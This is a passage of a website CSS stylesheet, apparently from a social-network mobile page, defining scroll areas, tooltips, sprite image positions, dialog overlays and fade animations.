        }

        .scrollArea-horizontal .scrollAreaBody {
            display: block;
            white-space: nowrap
        }

        .scrollAreaBodyRTL {
            direction: ltr
        }

        .scrollArea-horizontal .scrollAreaColumn {
            display: inline-block;
            vertical-align: top;
            white-space: nowrap
        }

        .scrollAreaColumnContentRTL {
            direction: rtl
        }

        .scrollArea .scrollAreaPaginator {
            line-height: 0;
            margin-bottom: 6px;
            margin-top: 8px;
            text-align: center;
            width: 100%
        }

        .scrollArea .scrollAreaPaginator.scrollAreaExternalPaginator {
            background: #ccc;
            border-radius: 0 0 4px 4px;
            border-top: 0;
            margin: 0;
            margin-bottom: 16px;
            padding: 8px 0
        }

        .scrollArea .scrollAreaPaginator.scrollAreaFloatBottomPaginator {
            bottom: 2px;
            position: absolute;
            z-index: 6
        }

        .scrollArea .scrollAreaPaginatorBubble {
            background-image: url(/rsrc.php/v3/yO/r/FfCZ1h0fA6C.png);
            background-position: right;
            background-size: 10px;
            display: inline-block;
            height: 5px;
            margin: 0 3px;
            width: 5px
        }

        .x2 .scrollArea .scrollAreaPaginatorBubble {
            background-image: url(/rsrc.php/v3/yL/r/yOArNIXqGHc.png)
        }

        .scrollArea .scrollAreaPaginatorBubble.scrollAreaPaginatorBubbleActive {
            background-position: left
        }

        .scrollArea .arrow {
            height: 28px;
            width: 28px
        }

        .scrollArea .leftArrowContainer,
        .scrollArea .rightArrowContainer {
            align-items: center;
            background-color: #fff;
            border: 1px solid #dadde1;
            cursor: pointer;
            display: flex;
            height: 40px;
            justify-content: center;
            opacity: .85;
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            width: 40px;
            z-index: 10
        }

        .scrollArea .rightArrowContainer {
            border-bottom-left-radius: 40px;
            border-right: none;
            border-top-left-radius: 40px;
            right: -20px
        }

        .scrollArea .leftArrowContainer {
            border-bottom-right-radius: 40px;
            border-left: none;
            border-top-right-radius: 40px;
            left: -20px
        }

        .scrollArea .leftArrow {
            margin-right: -18px
        }

        .scrollArea .rightArrow {
            margin-left: -18px
        }

        ._5tg_ {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        ._5bob ._5bo0 {
            background: transparent;
            color: #fff
        }

        ._5bob ._5c0e {
            opacity: .95
        }

        ._5bob ._5c0e::before {
            background: linear-gradient(#4d4d4d, #2f2f2f);
            border-radius: 2px;
            bottom: 0;
            content: '';
            left: 0;
            position: absolute;
            right: 0;
            top: 0;
            z-index: -2
        }

        ._5bob ._5c0e::after {
            border-image: url(/rsrc.php/v3/yX/r/Z8SOy1Pv8hn.png) 12 18 22 18 repeat stretch;
            border-width: 12px 18px 22px;
            bottom: -16px;
            left: -8px;
            right: -8px;
            top: -8px
        }

        .x1-5 ._5bob ._5c0e::after,
        .x2 ._5bob ._5c0e::after {
            border-image: url(/rsrc.php/v3/y8/r/hQfpNS-qtSw.png) 24 36 44 36 repeat stretch
        }

        ._5bob ._5bo2 ._5bn_ {
            background-image: url(/rsrc.php/v3/y1/r/RPG0M7w7C5j.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -70px;
            bottom: -33px
        }

        ._5bob ._5bo1 ._5bn_ {
            background-image: url(/rsrc.php/v3/y1/r/RPG0M7w7C5j.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -221px;
            top: -21px
        }

        ._3jcw ._5c0e {
            opacity: 1
        }

        ._3jcw ._5c0e::before {
            background: #598bff
        }

        ._3jcw ._5c0e::after {
            border-image: url(/rsrc.php/v3/y4/r/r_QTCAPQJBr.png) 24 24 32 24 stretch;
            border-width: 24px 24px 32px
        }

        .x1-5 ._3jcw ._5c0e::after,
        .x2 ._3jcw ._5c0e::after {
            border-image: url(/rsrc.php/v3/yh/r/9Vj4JBP-jrX.png) 48 48 64 48 stretch
        }

        ._3jcw ._5bo2 ._5bn_ {
            background-image: url(/rsrc.php/v3/y1/r/RPG0M7w7C5j.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -35px;
            bottom: -32px
        }

        ._3jcw._1s0f ._5bo2 ._5bn_ {
            background-image: url(/rsrc.php/v3/y1/r/RPG0M7w7C5j.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 0;
            bottom: -33px
        }

        ._3jcw ._5bo1 ._5bn_ {
            background-image: url(/rsrc.php/v3/y1/r/RPG0M7w7C5j.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -198px;
            top: -20px
        }

        ._3jcw._1s0f ._5bo1 ._5bn_ {
            background-image: url(/rsrc.php/v3/y1/r/RPG0M7w7C5j.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -175px;
            top: -21px
        }

        ._73p3 ._5c0e {
            opacity: 1
        }

        ._73p3 ._5c0e::before {
            background: #fff
        }

        ._73p3 ._5c0e::after {
            border-image: url(/rsrc.php/v3/yN/r/hCPE8xszF4g.png) 24 24 32 24 stretch;
            border-width: 24px 24px 32px
        }

        .x1-5 ._73p3 ._5c0e::after,
        .x2 ._73p3 ._5c0e::after {
            border-image: url(/rsrc.php/v3/yU/r/_f823bhnU3R.png) 48 48 64 48 stretch
        }

        ._73p3 ._5bo2 ._5bn_ {
            background-image: url(/rsrc.php/v3/y1/r/RPG0M7w7C5j.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -140px;
            bottom: -32px
        }

        ._73p3._1s0f ._5bo2 ._5bn_ {
            background-image: url(/rsrc.php/v3/y1/r/RPG0M7w7C5j.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -105px;
            bottom: -33px
        }

        ._73p3 ._5bo1 ._5bn_ {
            background-image: url(/rsrc.php/v3/y1/r/RPG0M7w7C5j.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -267px;
            top: -20px
        }

        ._73p3._1s0f ._5bo1 ._5bn_ {
            background-image: url(/rsrc.php/v3/y1/r/RPG0M7w7C5j.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -244px;
            top: -21px
        }

        ._73p4 {
            color: #000
        }

        ._98p9 ._5c0e {
            background: transparent;
            opacity: 1
        }

        ._98p9 ._5c0e::before {
            background: #385898;
            border-radius: 10px
        }

        ._98p9 ._5c0e::after {
            border-style: none
        }

        .x1-5 ._98p9 ._5c0e::after,
        .x2 ._98p9 ._5c0e::after {
            border-image: none
        }

        ._98p9 ._5bo1 ._5bn_ {
            background-image: url(/rsrc.php/v3/yC/r/7lEN_bvQeN4.png);
            background-position: 0 0;
            background-repeat: no-repeat;
            background-size: 24px 12px;
            top: -11px
        }

        ._98p9 ._5c0f {
            padding: 12px 15px
        }

        ._9n4m ._5c0e {
            background: transparent;
            opacity: 1
        }

        ._9n4m ._5c0e::before {
            background: #fff;
            border: 1.5px solid rgba(0, 0, 0, .1);
            border-radius: 10px;
            box-shadow: 0 0 5px rgba(0, 0, 0, .15)
        }

        ._9n4m ._5c0e::after {
            border-style: none
        }

        .x1-5 ._9n4m ._5c0e::after,
        .x2 ._9n4m ._5c0e::after {
            border-image: none
        }

        ._9n4m ._5bo1 ._5bn_ {
            background-image: url(/rsrc.php/v3/yW/r/3IwmhWDp5jP.png);
            background-position: 10px 0;
            background-size: 24px 12px;
            -webkit-filter: drop-shadow(-1px -1px 1px rgba(0, 0, 0, .1));
            top: -10px
        }

        ._9n4m ._5c0f {
            padding: 12px 15px
        }

        ._56bg {
            border: 0;
            display: block;
            margin: 0;
            padding: 0
        }

        ._5kpc {
            color: #4b4f56
        }

        ._59zc ._59zd {
            color: #1d2129;
            font-size: small
        }

        .touch ._56bg {
            -webkit-appearance: none;
            box-sizing: border-box;
            width: 100%
        }

        ._56be {
            position: relative
        }

        ._56be::before {
            border-color: rgba(0, 0, 0, .07) rgba(0, 0, 0, .11) rgba(0, 0, 0, .18);
            border-radius: 4px;
            border-style: solid;
            border-width: 1px;
            bottom: -1px;
            content: '';
            left: -1px;
            pointer-events: none;
            position: absolute;
            right: -1px;
            top: -1px
        }

        .ios ._56be::before {
            border-image: url(/rsrc.php/v3/yI/r/VrPBcSeufT9.png) 6 6 8 6 repeat;
            border-radius: 0;
            border-width: 6px 6px 8px;
            bottom: -4px;
            color: transparent;
            left: -2px;
            right: -2px;
            top: -2px
        }

        .wp ._56be::before {
            z-index: 0
        }

        .ios.x2 ._56be::before {
            border-image: url(/rsrc.php/v3/yO/r/5NR43BsYs8o.png) 12 12 16 12 repeat
        }

        ._67gk ._56be::before {
            border-style: none
        }

        ._56bf {
            border-radius: 4px;
            overflow: hidden
        }

        .ios ._56bf {
            border-radius: 3px
        }

        ._56bf._58k5 {
            overflow: visible;
            position: relative
        }

        ._56bf._58k5::before,
        ._56bf._58k5::after {
            border-bottom: 1px solid transparent;
            content: '';
            display: block
        }

        ._56bf._58k5::before {
            margin-bottom: -1px
        }

        ._56bf._58k5::after {
            margin-top: -1px
        }

        ._5pkb,
        ._5pkc {
            margin: 0
        }

        ._5pkb li,
        ._5pkc li {
            display: block;
            list-style: none
        }

        .touch ._5m_x {
            height: 0;
            position: absolute;
            width: 100%;
            z-index: 13
        }

        .touch ._3wo2 ._5m_x {
            z-index: 25
        }

        ._4sc_,
        ._5m_v,
        ._7teu {
            box-sizing: border-box;
            overflow: hidden;
            pointer-events: none;
            position: absolute;
            width: 100%;
            z-index: 0
        }

        ._5m_v {
            padding-bottom: 28px
        }

        ._7teu {
            align-content: center;
            display: flex;
            height: 100vh;
            justify-content: center
        }

        ._5m_u {
            border-radius: 3px;
            margin: auto 0;
            pointer-events: auto;
            position: relative;
            text-align: left
        }

        ._7e0o ._5m_u {
            background: transparent;
            border-radius: 2.7px;
            display: block;
            height: auto !important;
            margin: 0 auto;
            width: 83vw
        }

        ._5m_w {
            background: rgba(0, 0, 0, .5);
            bottom: 0;
            left: 0;
            pointer-events: auto;
            position: fixed;
            top: -600px;
            width: 100%;
            z-index: -2
        }

        ._7e0o ._5m_w {
            background: rgba(0, 0, 0, .6)
        }

        ._7e0o ._5m_v {
            top: 50vh;
            transform: translateY(-50%)
        }

        ._5m_t>:first-child {
            border-top-left-radius: 3px;
            border-top-right-radius: 3px
        }

        ._5m_t>:last-child {
            border-bottom-left-radius: 3px;
            border-bottom-right-radius: 3px
        }

        ._5m_s {
            background: #fff;
            border-radius: 3px;
            bottom: 0;
            left: 0;
            position: absolute;
            right: 0;
            top: 0;
            z-index: -1
        }

        ._5m_s::after {
            border-color: transparent;
            border-image: url(/rsrc.php/v3/ym/r/AZGW9iI2znw.png) 40 45 45 45 repeat;
            border-style: solid;
            border-width: 40px 45px 45px;
            bottom: -28px;
            content: '';
            left: -24px;
            pointer-events: none;
            position: absolute;
            right: -24px;
            top: -16px
        }

        .x1-5 ._5m_s::after,
        .x2 ._5m_s::after {
            border-image: url('') 80 90 90 90 repeat
        }

        .b69pgiyc {
            border-top: 1px solid #000
        }

        .cj2yf7tv {
            border-bottom: 1px solid #83c8c0
        }

        .dds0pwjm {
            border-left: 2px
        }

        .e3oan9mo {
            border-right: 1px solid var(--fds-blue-60)
        }

        .e62nu8nf {
            border-left: 6px solid #ffd700
        }

        .ettpwnw0 {
            border-right: 1px solid #000
        }

        .gaks32x0 {
            border-right: 1px solid #d3d3d3
        }

        .grtqx538 {
            border-bottom: 1px solid #d3d3d3
        }

        .ik2fxa2m {
            border-bottom: 1px solid var(--fds-blue-60)
        }

        .kqwbrkre {
            border-top: 1px solid rgba(0, 0, 0, .1)
        }

        .lbnk25a9 {
            border-bottom: 1px solid #000
        }

        .lecnbk15 {
            border-top: 2px
        }

        .m1ngl1jn {
            border-left: 1px solid var(--fds-blue-60)
        }

        .nd232ve5 {
            border-bottom: 1px solid #dee3e9
        }

        .nomyvk0e {
            border-right: 2px
        }

        .of8caxrv {
            border-bottom: 2px
        }

        .rw9bjcn8 {
            border-left: 1px solid #000
        }

        .sg6u6bgo {
            border-top: 1px solid var(--fds-blue-60)
        }

        .t8x143rz {
            border-top: 1px solid #d3d3d3
        }

        .axq4kd1r {
            border-left-style: solid
        }

        .fnz597ay {
            border-left-color: var(--fds-divider-on-white)
        }

        .kry34een {
            border-right-style: solid
        }

        .l01hfcbs {
            border-bottom-color: var(--fds-divider-on-white)
        }

        .l6ngr78c {
            border-bottom-style: solid
        }

        .livf2ngg {
            border-top-style: solid
        }

        .mixghspx {
            border-right-color: var(--fds-divider-on-white)
        }

        .mn4tmbn7 {
            border-top-color: red
        }

        .mvkd54pz {
            border-top-color: var(--fds-divider-on-white)
        }

        .nsfvi0tc {
            border-left-color: red
        }

        .spsloylh {
            border-bottom-color: red
        }

        .u6xemm52 {
            border-right-color: red
        }

        .a736byjk {
            margin-top: 16px
        }

        .ajc4pgcz {
            border-top-left-radius: 4px
        }

        .aq0oz31o {
            padding-bottom: 4px
        }

        .az6yx4zo {
            margin-top: 20px
        }

        .b2jv5jx0 {
            font-size: .75rem
        }

        .b4ees9m2 {
            border-top-left-radius: 50%
        }

        .b7ghw0q3 {
            border-bottom-right-radius: 2px
        }

        .bl6smi1b {
            margin-left: 12px
        }

        .bm9cogv1 {
            border-bottom-right-radius: 50%
        }

        .bqk2cmhx {
            display: flex
        }

        .br18vdei {
            white-space: nowrap
        }

        .br2iep9g {
            overflow-x: auto
        }

        .by9lnrz5 {
            padding-left: 16px
        }

        .c07uvqdh {
            line-height: 1.1667
        }

        .c0ws1xt3 {
            margin-left: 16px
        }

        .c5zxjos5 {
            padding-top: 38px
        }

        .c7iks69n {
            align-self: center
        }

        .c8bwyxyo {
            margin-bottom: 2px
        }

        .cai1h4ab {
            margin-left: -7px
        }

        .cc3354yz {
            font-size: .875rem
        }

        .cd3a17ap {
            flex-direction: column-reverse
        }

        .ckzp364x {
            margin-top: 4px
        }

        .clhli8bf {
            border-bottom-left-radius: 8px
        }

        .clv63fh8 {
            margin-bottom: 30px
        }

        .co0eq0o4 {
            left: -200px
        }

        .cqfd74dm {
            padding-right: 12px
        }

        .cr6mnvvq {
            padding-right: 2px
        }

        .cvk2e4nw {
            display: block
        }

        .cxpxs16t {
            font-size: .8125rem
        }

        .cyoi28at {
            margin-left: -20px
        }

        .czpthc59 {
            margin-left: 4px
        }

        .d0ij8a0q {
            margin-bottom: 4px
        }

        .d0jjqcgh {
            color: #616161
        }

        .dddgsxho {
            color: dimgrey
        }

        .ddlaarzj {
            margin-bottom: 24px
        }

        .degumeh2 {
            margin-right: 12px
        }

        .dg9uiq7o {
            margin-right: 16px
        }

        .dgto4f8d {
            font-size: 1.125rem
        }

        .dnk4eb39 {
            border-bottom-left-radius: 2px
        }

        .dolkw6d2 {
            margin-left: 16px
        }

        .dsy3to1x {
            margin-left: 8px
        }

        .e0jdubkw {
            border-top-right-radius: 4px
        }

        .e7x8evf7 {
            position: absolute
        }

        .e96s1twd {
            width: 96px
        }

        .e9v8n9mh {
            margin-right: 12px
        }

        .ebbrkfdi {
            width: 95%
        }

        .eec9vxyx {
            height: 400px
        }

        .efg6ql7l {
            padding-top: 8px
        }

        .eqkbxoob {
            width: 28px
        }

        .eqsksver {
            padding-bottom: 8px
        }

        .ewa5ad6y {
            border-top-right-radius: 50%
        }

        .eyo6r0sy {
            margin-top: 24px
        }

        .f06luu42 {
            font-size: 1.0625rem
        }

        .f0zwbi09 {
            font-size: medium
        }

        .f4fnatew {
            background-color: #fff
        }

        .f6z06u0q {
            flex-grow: 1
        }

        .fakne62h {
            background-color: #fff
        }

        .fazzd4kq {
            background-color: var(--fds-white)
        }

        .fcw6hgur {
            margin-top: 1px
        }

        .fopwnnsz {
            border-top-right-radius: 2px
        }

        .fup1b1au {
            border-bottom-right-radius: 8px
        }

        .fwv7dn6g {
            padding-top: 4px
        }

        .g2xs7bag {
            margin-bottom: 20px
        }

        .g6rzsw14 {
            max-height: 400px
        }

        .g7idrcdy {
            overflow-y: hidden
        }

        .gck3s2ej {
            color: #1c2b33
        }

        .gd0ws4ck {
            margin-left: 14px
        }

        .gd2m2al3 {
            flex-flow: column
        }

        .gkphj4wt {
            box-shadow: 0 2px 8px #d3d3d3
        }

        .gnc8k6w3 {
            color: #000
        }

        .gpvorwxf {
            box-sizing: border-box
        }

        .gtfwauy7 {
            margin-left: 8px
        }

        .gumnut9f {
            margin-top: 25%
        }

        .gvg074zl {
            width: 40px
        }

        .h0g48zn6 {
            line-height: 1.5
        }

        .h1pmokue {
            font-size: .9375rem
        }

        .h39r7hk3 {
            top: -400px
        }

        .h63ruwn6 {
            height: 64px
        }

        .h65csrl6 {
            justify-content: space-between
        }

        .henee22p {
            margin-left: 4px
        }

        .hibphbpw {
            width: 98%
        }

        .hiifpb78 {
            padding-bottom: 2px
        }

        .hmygoydy {
            max-height: 50px
        }

        .hn502y7s {
            margin-right: 24px
        }

        .hqqtd8py {
            padding-left: 2px
        }

        .i0bkgpck {
            padding-right: 16px
        }

        .i4q0gddf {
            font-style: normal
        }

        .i60pil34 {
            color: red
        }

        .ia59nffe {
            width: 48px
        }

        .id0l1v95 {
            margin-right: 30%
        }

        .ils90vxa {
            padding-top: 56px
        }

        .itzd5aea {
            vertical-align: middle
        }

        .iwywwitg {
            border-bottom-right-radius: 4px
        }

        .iz3fp6mr {
            padding-left: 4px
        }

        .j06iqor1 {
            margin-bottom: 25%
        }

        .j2utryt6 {
            margin-left: 30%
        }

        .j5817kb4 {
            height: 100%
        }

        .je98ym7w {
            overflow-x: scroll
        }

        .jnezh2mh {
            padding-top: 32px
        }

        .jwo2i6d6 {
            line-height: 18px
        }

        .k08annfn {
            background-color: #bee1dc
        }

        .k0qycck0 {
            padding-left: 12px
        }

        .k1r6na51 {
            word-wrap: break-word
        }

        .k2majjrm {
            background-color: #d3d3d3
        }

        .k4s39ojr {
            color: #fff
        }

        .k4yammg7 {
            margin-top: 8px
        }

        .k5l1szqw {
            margin-bottom: 40%
        }

        .k7cgwdkt {
            color: #1e90ff
        }

        .kcjwlexp {
            flex-direction: row
        }

        .kdymer7h {
            margin-left: 25%
        }

        .kdzpzg4v {
            box-shadow: 0 8px 16px 0 rgba(0, 0, 0, .2)
        }

        .kgy9cjxm {
            height: 96px
        }

        .kmat8zoj {
            margin-right: 8px
        }

        .ko9o918l {
            margin-top: 12px
        }

        .kx8nrx0p {
            height: 40px
        }

        .ky8zwa8k {
            padding-left: 8px
        }

        .l2iz4wun {
            color: #155257
        }

        .l54ce92o {
            margin-right: 4px
        }

        .ld1i0o1f {
            background-color: #f1f4f9
        }

        .ldze66pj {
            margin-right: 20px
        }

        .li1z7eyt {
            width: 100%
        }

        .ll7e7rsb {
            height: 48px
        }

        .ll8k35pi {
            line-height: 1.25
        }

        .lqk93flu {
            margin-left: 16px
        }

        .lrcessge {
            font-family: "Optimistic Text", Helvetica, Arial, sans-serif !important
        }

        .m0cg9jwz {
            font-family: "Optimistic Display", Helvetica, Arial, sans-serif !important
        }

        .m0y1ydpf {
            float: right
        }

        .m1k9x90j {
            width: 115%
        }

        .m8kmv5sv {
            margin-top: 2px
        }

        .mdolx3mm {
            border-top-left-radius: 8px
        }

        .mkv4s9ms {
            color: green
        }

        .mwf70xtg {
            padding-right: 8px
        }

        .mymuo5mb {
            justify-content: center
        }

        .n0j78fpu {
            margin-bottom: 6px
        }

        .n1ovukth {
            margin-bottom: 8px
        }

        .n1zo173g {
            flex-flow: row
        }

        .n3snyrml {
            background-color: #1e90ff
        }

        .n66iisjn {
            border-top-right-radius: 8px
        }

        .n8rcgkuz {
            padding-top: 16px
        }

        .nadz3zbn {
            background-color: #fff
        }

        .nbck62z6 {
            margin-bottom: 16px
        }

        .ni5cec3b {
            margin-top: 18px
        }

        .nmafi0l8 {
            margin-right: 2px
        }

        .nqkowxci {
            background-color: #fff
        }

        .nu9u7r0j {
            border-bottom-left-radius: 4px
        }

        .nw9t04uo {
            height: 180px
        }

        .o0q6sgkb {
            padding-bottom: 24px
        }

        .o3vfct8s {
            height: 28px
        }

        .o72pzlyx {
            margin-left: 20px
        }

        .o7lh8lnk {
            overflow-y: auto
        }

        .oaf7r2mm {
            top: 20px
        }

        .ol47yj61 {
            padding-bottom: 16px
        }

        .oq2vitai {
            font-weight: 500
        }

        .orsvsl3q {
            color: #465a69
        }

        .otf8b49z {
            text-overflow: ellipsis
        }

        .ouxdmvhg {
            align-items: center
        }

        .p8zdhr17 {
            padding-right: 4px
        }

        .pbtzjnpk {
            padding-top: 24px
        }

        .pcykuyss {
            font-size: 2rem
        }

        .peurbqtq {
            position: relative
        }

        .pj9k9vjs {
            margin-right: 16px
        }

        .pnwonvnc {
            left: 5%
        }

        .psd57s99 {
            background-color: #f6f6f7
        }

        .puj0wt4f {
            padding-bottom: 12px
        }

        .pvsr14bg {
            padding-bottom: 56px
        }

        .pylyytvp {
            padding-top: 12px
        }

        .q25tazcr {
            margin-right: 25%
        }

        .q78msd7t {
            border-top-left-radius: 2px
        }

        .qbx4qu2k {
            font-size: 1rem
        }

        .qfi3xzxs {
            margin-top: 32px
        }

        .qfoi38bv {
            margin-bottom: 0
        }

        .qkeprkg8 {
            top: 0
        }

        .qlphjcf1 {
            margin-top: 45%
        }

        .qsx01aqi {
            margin-top: 40%
        }

        .qtw1e6y7 {
            margin-left: 12px
        }

        .qvjo9lga {
            background-color: #000
        }

        .rd9252ts {
            padding-bottom: 32px
        }

        .rjc3blf5 {
            width: 200px
        }

        .rowprg0d {
            font-weight: 700
        }

        .rs3fnyn0 {
            display: inline
        }

        .rvg2qudz {
            text-align: center
        }

        .s0xya8gq {
            background-color: var(--fds-blue-60)
        }

        .s109n3kw {
            flex-direction: column
        }

        .sezoa45j {
            height: 1px
        }

        .sf9ujq4f {
            margin-right: 10px
        }

        .slqx7htz {
            overflow-y: scroll
        }

        .sm1kic8i {
            width: 80%
        }

        .smfuu82o {
            margin-top: 5px
        }

        .smsup19f {
            margin-right: 16px
        }

        .ss4j54eu {
            border-bottom-left-radius: 50%
        }

        .t0yjozgj {
            font-size: 1.25rem
        }

        .t6km25co {
            margin-right: 4px
        }

        .ta139xzh {
            font-weight: 400
        }

        .tb3p9g8k {
            display: inline-block
        }

        .tdnnhjjh {
            z-index: 1
        }

        .tefhj3cv {
            align-items: flex-start
        }

        .tj3ec64u {
            margin-right: 8px
        }

        .tko4l5md {
            padding-top: 2px
        }

        .tmd5wfqi {
            margin-top: -18px
        }

        .tngjibk1 {
            margin-top: 8px
        }

        .trt10z0h {
            margin-left: 2px
        }

        .ts6ueh3c {
            color: #576b95
        }

        .u9wnhclj {
            overflow-x: hidden
        }

        .dl3i4jb3:hover {
            text-decoration: none
        }

        .ew72880s:hover {
            background-color: #d3d3d3
        }

        .ldbchqe1:hover {
            color: currentcolor
        }

        .sp_9Jsk4oHhE3z {
            background-image: url(/rsrc.php/v3/yl/r/w5n8Z919Fwj.png);
            background-size: auto;
            background-repeat: no-repeat;
            display: inline-block;
            height: 16px;
            width: 16px
        }

        .sp_9Jsk4oHhE3z.sx_9d32a2 {
            background-position: 0 -73px
        }

        .sp_9Jsk4oHhE3z.sx_a140ce {
            background-position: -17px -73px
        }

        .sp_9Jsk4oHhE3z.sx_df1d65 {
            background-position: -34px -73px
        }

        .sp_9Jsk4oHhE3z.sx_dbc748 {
            background-position: 0 -90px
        }

        .sp_9Jsk4oHhE3z.sx_997658 {
            background-position: -17px -90px
        }

        .sp_9Jsk4oHhE3z.sx_8a94f2 {
            width: 54px;
            height: 24px;
            background-position: 0 0
        }

        .sp_9Jsk4oHhE3z.sx_d07995 {
            width: 20px;
            height: 20px;
            background-position: -33px -25px
        }

        .sp_9Jsk4oHhE3z.sx_b02eab {
            width: 12px;
            height: 12px;
            background-position: -11px -124px
        }

        .sp_9Jsk4oHhE3z.sx_b1857e {
            background-position: -34px -90px
        }

        .sp_9Jsk4oHhE3z.sx_bb98c6 {
            background-position: 0 -107px
        }

        .sp_9Jsk4oHhE3z.sx_59cd43 {
            width: 12px;
            height: 12px;
            background-position: -24px -124px
        }

        .sp_9Jsk4oHhE3z.sx_b5aecc {
            width: 12px;
            height: 12px;
            background-position: -37px -124px
        }

        .sp_9Jsk4oHhE3z.sx_a7cff4 {
            width: 32px;
            height: 26px;
            background-position: 0 -25px
        }

        .sp_9Jsk4oHhE3z.sx_88e43b {
            width: 15px;
            height: 9px;
            background-position: -17px -107px
        }

        .sp_9Jsk4oHhE3z.sx_d53292 {
            width: 10px;
            height: 13px;
            background-position: -42px -52px
        }

        .sp_9Jsk4oHhE3z.sx_c5bdaa {
            width: 10px;
            height: 13px;
            background-position: 0 -124px
        }

        .sp_9Jsk4oHhE3z.sx_3a0e35 {
            width: 20px;
            height: 20px;
            background-position: 0 -52px
        }

        .sp_9Jsk4oHhE3z.sx_6904c9 {
            width: 20px;
            height: 20px;
            background-position: -21px -52px
        }

        .sp_9Jsk4oHhE3z.sx_5df033 {
            width: 9px;
            height: 9px;
            background-position: -33px -107px
        }

        .sp_IyAHL1YUmTC {
            background-image: url(/rsrc.php/v3/yF/r/Qbgy3PpJOff.png);
            background-size: auto;
            background-repeat: no-repeat;
            display: inline-block;
            height: 16px;
            width: 17px
        }

        .sp_IyAHL1YUmTC.sx_034b8b {
            width: 12px;
            height: 12px;
            background-position: 0 -17px
        }

        .sp_IyAHL1YUmTC.sx_f20161 {
            background-position: -17px 0
        }

        .selected .sp_IyAHL1YUmTC.sx_f20161 {
            background-position: 0 0
        }

        .sp_PVuWzGXsrW0 {
            background-image: url(/rsrc.php/v3/y1/r/RPG0M7w7C5j.png);
            background-size: auto;
            background-repeat: no-repeat;
            display: inline-block;
            height: 34px;
            width: 52px
        }

        .sp_PVuWzGXsrW0.sx_17b6d8 {
            background-position: 0 0
        }

        .sp_PVuWzGXsrW0.sx_fa1482 {
            background-position: 0 -35px
        }

        .sp_PVuWzGXsrW0.sx_394c40 {
            height: 22px;
            background-position: 0 -175px
        }

        .sp_PVuWzGXsrW0.sx_40a321 {
            height: 22px;
            background-position: 0 -198px
        }

        .sp_PVuWzGXsrW0.sx_c21199 {
            background-position: 0 -70px
        }

        .sp_PVuWzGXsrW0.sx_1cb801 {
            height: 22px;
            background-position: 0 -221px
        }

        .sp_PVuWzGXsrW0.sx_624d8b {
            background-position: 0 -105px
        }

        .sp_PVuWzGXsrW0.sx_c2df32 {
            background-position: 0 -140px
        }

        .sp_PVuWzGXsrW0.sx_296bf2 {
            height: 22px;
            background-position: 0 -244px
        }

        .sp_PVuWzGXsrW0.sx_34be03 {
            height: 22px;
            background-position: 0 -267px
        }

        .sp_qU5OrZIwAEh {
            background-image: url(/rsrc.php/v3/yX/r/NOvYl6G17ts.png);
            background-size: auto;
            background-repeat: no-repeat;
            display: inline-block;
            height: 12px;
            width: 12px
        }

        .sp_qU5OrZIwAEh.sx_12b773 {
            background-position: 0 0
        }

        .sp_qU5OrZIwAEh.sx_905340 {
            background-position: 0 -13px
        }

        .sp_qU5OrZIwAEh.sx_b98685 {
            background-position: 0 -26px
        }

        ._3fcy {
            background: rgba(0, 0, 0, .6);
            border-radius: 22px;
            color: #fff;
            font-family: Roboto, sans-serif;
            max-width: 80%;
            min-height: 18px;
            padding: 12px 20px;
            text-align: center
        }

        ._2jow {
            animation: fadein .5s ease-in;
            -webkit-backface-visibility: hidden;
            display: flex;
            flex-direction: row;
            justify-content: center;
            position: fixed;
            top: 50%;
            width: 100%;
            z-index: 1000
        }

        ._2jow ._66m3 {
            display: flex
        }

        ._2jow._3fc- {
            bottom: 10%;
            top: unset
        }

        ._4zke ._2jow {
            animation: fadeout .75s ease-out;
            opacity: 0;
            visibility: hidden
        }

        @keyframes fadein {
            from {
                opacity: 0;
                visibility: hidden
            }
            to {
                opacity: 1;
                visibility: visible
            }
        }

        @keyframes fadeout {
            from {
                opacity: 1;
                visibility: visible
            }
            to {
                opacity: 0;
                visibility: hidden
            }
        }

        ._47e3,
        ._4ay8 {
            line-height: 0;
            vertical-align: middle
        }

        ._4ay8 {
            font-style: normal !important;
            font-weight: 400 !important
        }

        ._4ay8._3kkw {
            font-size: 16px
        }

        ._4ay8._366d {
            font-size: 18px
        }

        ._4ay8._366e {
            font-size: 20px
        }

        ._4ay8._48cb {
            font-size: 24px
        }

        ._4ay8._5-0n {
            font-size: 28px
        }

        ._4ay8._5-0o {
            font-size: 30px
        }

        ._4ay8._5-0p {
            font-size: 32px
        }

        ._4ay8._2oah {
            font-size: 36px
        }

        ._4ay8._4352 {
            font-size: 56px
        }

        ._4ay8._435o {
            font-size: 112px
        }

        span._47e3 .img {
            vertical-align: -3px
        }

        i._47e3 {
            display: inline-block;
            vertical-align: top
        }

        i._47e3._3kkw {
            background-size: 16px 16px;
            height: 16px;
            width: 16px
        }

        i._47e3._366d {
            background-size: 18px 18px;
            height: 18px;
            width: 18px
        }

        i._47e3._366e {
            background-size: 20px 20px;
            height: 20px;
            width: 20px
        }

        i._47e3._48cb {
            background-size: 24px 24px;
            height: 24px;
            width: 24px
        }

        ._1gwo:before,
        span._47e3:before {
            clip: rect(1px, 1px, 1px, 1px);
            content: attr(title), "";
            height: 1px;
            overflow: hidden;
            position: absolute;
            white-space: nowrap;
            width: 1px
        }

        ._skr,
        ._7oe {
            display: inline;
            font-size: 0;
            width: 0
        }

        ._5mfr {
            margin: 0 1px
        }

        ._6qdm {
            background-repeat: no-repeat;
            background-size: contain;
            color: transparent;
            display: inline-block;
            text-decoration: none;
            text-shadow: none;
            vertical-align: text-bottom
        }

        ._6qdm::selection {
            background-color: highlight;
            color: transparent
        }

        ._6qdm._6qdm .pun {
            color: transparent
        }

        ._7c4h {
            display: inline-block;
            position: relative
        }

        ._7c4l {
            display: block;
            left: 0;
            position: absolute;
            top: 0
        }

        ._4m35 {
            vertical-align: bottom
        }

        ._4m37 {
            vertical-align: middle
        }

        ._4m39 {
            vertical-align: top
        }

        .touch ._54k8._87g1._87g2 {
            border-radius: 5px;
